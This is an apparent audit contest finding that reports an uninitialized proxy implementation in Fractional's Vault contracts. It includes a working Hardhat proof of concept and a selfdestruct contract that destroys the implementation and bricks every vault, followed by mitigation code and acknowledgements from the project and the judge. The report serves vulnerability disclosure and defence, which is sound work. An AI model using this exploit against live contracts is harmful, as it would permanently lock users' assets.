[H-01] Vault implementation can be destroyed leading to loss of all assets
Submitted by 0xA5DF, also found by 242, 0x, 0xsanson, Critical, sorrynotsorry, unforgiven, and zzzitron
https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L19-L22
https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L11-L25
Vulnerability Details
This is a basic uninitialized proxy bug, theVaultFactorycreates a single implementation ofVaultand then creates a proxy to that implementation every time a new vault needs to be deployed.
The problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via theexecutefunction) to a function with theselfdestructopcode.
Once the implementation is destroyed all of the vaults will be unusable. And since there’s no logic in the proxies to update the implementation - that means this is permanent (i.e. there’s no way to call any function on any vault anymore, they’re simply dead).
Impact
This is a critical bug, since ALL assets held by ALL vaults will be lost. There’s no way to transfer them out and there’s no way to run any function on any vault.
Also, there’s no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there’s no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).
Proof of Concept
I created the PoC based on thescripts/deploy.jsfile, here’s a stripped-down version of that:
const{ethers} =require("hardhat");constZERO_ADDRESS="0x0000000000000000000000000000000000000000";asyncfunctionmain() {const[deployer,attacker] =awaitethers.getSigners();// Get all contract factoriesconstBaseVault=awaitethers.getContractFactory("BaseVault");constSupply=awaitethers.getContractFactory("Supply");constVaultRegistry=awaitethers.getContractFactory("VaultRegistry");// Deploy contractsconstregistry=awaitVaultRegistry.deploy();awaitregistry.deployed();constsupply=awaitSupply.deploy(registry.address);awaitsupply.deployed();// notice that the `factory` var in the original `deploy.js` file is a different factory than the registry'sconstregistryVaultFactory=awaitethers.getContractAt("VaultFactory",awaitregistry.factory());constimplVaultAddress=awaitregistryVaultFactory.implementation();constvaultImpl=awaitethers.getContractAt("Vault",implVaultAddress);constbaseVault=awaitBaseVault.deploy(registry.address,supply.address);awaitbaseVault.deployed();// proxy vault - the vault that's used by the userletproxyVault=awaitdeployVault(baseVault,registry,attacker);constdestructorFactory=awaitethers.getContractFactory("Destructor");constdestructor=awaitdestructorFactory.deploy();letdestructData=destructor.interface.encodeFunctionData("destruct", [attacker.address]);constabi=newethers.utils.AbiCoder();constleafData=abi.encode(["address","address","bytes4"],[attacker.address,destructor.address,destructor.interface.getSighash("destruct")]);constleafHash=ethers.utils.keccak256(leafData);awaitvaultImpl.connect(attacker).init();awaitvaultImpl.connect(attacker).setMerkleRoot(leafHash);// we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in caseawaitvaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);// before: everything is fineletimplVaultCode=awaitethers.provider.getCode(implVaultAddress);console.log("Impl Vault code size before:",implVaultCode.length-2);// -2 for the 0x prefixletowner=awaitproxyVault.owner();console.log("Proxy Vault works fine, owner is: ",owner);awaitvaultImpl.connect(attacker).execute(destructor.address,destructData, []);// after: vault implementation is destructedimplVaultCode=awaitethers.provider.getCode(implVaultAddress);console.log("\nVault code size after:",implVaultCode.length-2);// -2 for the 0x prefixtry{owner=awaitproxyVault.owner();}catch(e) {console.log("Proxy Vault isn't working anymore.",e.toString().substring(0,300));}}asyncfunctiondeployVault(baseVault,registry,attacker) {constnodes=awaitbaseVault.getLeafNodes();consttx=awaitregistry.connect(attacker).create(nodes[0], [], []);constreceipt=awaittx.wait();constvaultEvent=receipt.events.find(e=>e.address==registry.address);constnewVaultAddress=vaultEvent.args._vault;constnewVault=awaitethers.getContractAt("Vault",newVaultAddress);returnnewVault;}if(require.main===module) {main()}
Destructor.solfile:
// SPDX-License-Identifier: MITpragmasolidity0.8.13;contractDestructor{functiondestruct(addresspayabledst)public{selfdestruct(dst);}}
Output:
Impl Vault code size before: 10386Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3Vault code size after: 0Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method="owner()", data="0x", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2)
Sidenote: as the comment in the code says, we don’t really need to transfer the ownership to the zero address.
It’s just that Foundry’sforgedid revert the destruction when I didn’t do it, with the error ofOwnerChanged(i.e. once theselfdestructwas called the owner became the zero address, which is different than the original owner) so I decided to add this just in case.
This is probably a bug inforge, since the contract shouldn’t destruct till the end of the tx (Hardhat indeed didn’t revert the destruction even when the attacker was the owner).
Tools Used
Hardhat
Recommended Mitigation Steps
Add init inVault’s constructor (and make theinitfunctionpublicinstead ofexternal):
contractVaultisIVault,NFTReceiver{/// @notice Address of vault owneraddresspublicowner;/// ...constructor(){// initialize implementationinit();}/// @dev Initializes nonce and proxy ownerfunctioninit()public{
Alternately you can add init inVaultFactory.solconstructor, but I think initializing in the contract itself is a better practice.
/// @notice Initializes implementation contractconstructor() {implementation=address(newVault());Vault(implementation).init();}
After mitigation the PoC will output this:
Error: VM Exception while processing transaction: reverted with custom error 'Initialized("0xa16E02E87b7454126E5E10d957A927A7F5B5d2be", "0x70997970C51812dc3A010C7d01b50e0d17dc79C8", 1)'at Vault._execute (src/Vault.sol:124)at Vault.init (src/Vault.sol:24)at HardhatNode._mineBlockWithPendingTxs....
stevennevins (Fractional) confirmed and commented:
Acknowledging the severity of this and will fix it. Thank you for reporting @0xA5DF.
HardlyDifficult (judge) commented:
Agree this is High risk. If this had gone unnoticed for a period of time, then later self destructing the implementation contract would brick all vaults and lose funds for potentially many users.